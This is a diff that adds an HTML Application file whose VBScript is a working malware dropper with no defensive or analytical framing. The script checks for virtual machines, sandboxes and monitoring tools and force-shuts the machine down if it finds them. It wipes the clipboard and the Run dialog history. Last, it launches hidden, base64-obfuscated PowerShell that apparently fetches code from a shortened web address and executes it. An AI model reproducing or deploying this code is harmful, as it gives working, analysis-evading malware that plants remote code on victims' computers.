@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION WINDOWSTATE="minimize">
+<script language="VBScript">
+On Error Resume Next
+function xeat 
+On Error Resume Next
+set win = GetObject("winmgmts:")
+set pli = win.ExecQuery ("select * from Win32_Process")
+for each process in pli
+pname = process.name
+if xpro.test(pname) then
+pname.terminate(1)
+End if		
+next
+a.run "shutdown.exe /s /f t 00" , 0 
+Close
+End Function 
+sub prcx    
+set pli = win.ExecQuery ("select * from Win32_Process")
+for each process in pli
+pname = process.name
+if xpro.test(pname) then
+call xeat
+End if		
+next
+End sub
+Randomize
+set b = createObject("scripting.FilESystemObject")
+set a = createObject("wscript.shell")
+Set CIMv2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
+set win = GetObject("winmgmts:")
+set pli = win.ExecQuery("select * from Win32_Process")
+delx = ""
+av = 0
+cname = lcase(a.expandenvironmentstrings("%computername%"))
+Set html = CreateObject("htmlfile")
+html.parentWindow.clipboardData.setData "text", ""
+Set html = Nothing
+d = a.regread("HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum\0")
+e = a.regread("HKLM\SYSTEM\ControlSet001\Control\SystemInformation\SystemProductname")
+f = a.regread("HKLM\SYSTEM\ControlSet001\Control\SystemInformation\BiosVersion")
+set xpro = New RegExp
+xpro.pattern = "processexplorer|autorun|wireshack|netmon|netstat|regshot|regmon|processhacker|sysinternalssuite|monitor|procdump|process explorer|tcpview|procexp|sysmon|httpdebugger|fiddler|vboxservice|df5serv|vboxtray|vmtoolsd|vmwaretray|vmwareuser|vgauthservice|vmacthlp|vmsrvc|vmusrvc|prl_cc|prl_tools|xenservice|qemu-ga|joeboxcontrol|ksdumperclient|ksdumper|joeboxserver"
+xpro.ignorecase = True
+set xvm = New RegExp
+xvm.pattern = "(vbox|vmware|virtual)"
+xvm.ignorecase = True
+set xnm = New RegExp
+xnm.pattern = "(hal9th|bee7370c-8c0c-4|qarzhrdbph|server1|wdagutilityaccount)"
+xnm.ignorecase = True
+if xvm.test(d) then
+call xeat
+elseif xvm.test(f) then
+call xeat
+elseif xvm.test(e) then
+call xeat
+elseif xnm.test(cname) then    
+call xeat
+End if 
+On Error Resume Next
+For i = 97 To 122
+letter = Chr(i)
+a.RegDelete "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU\" & letter
+Next
+a.run "cmd.exe /c cd c:\windows\System32\windowspowershell\v1.0 && powershell.exe -e LgAoACcAewAyAH0AewAxAH0AewAwAH0AJwAtAGYAJwB4ACcALAAnAEUAJwAsACcAaQAnACkAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB0AGkAbgB5AHUAcgBsAC4AYwBvAG0ALwBzAG0ASwBkAFcAMQAnACkA",0
+Close
+</script>
+</head>
+</html>
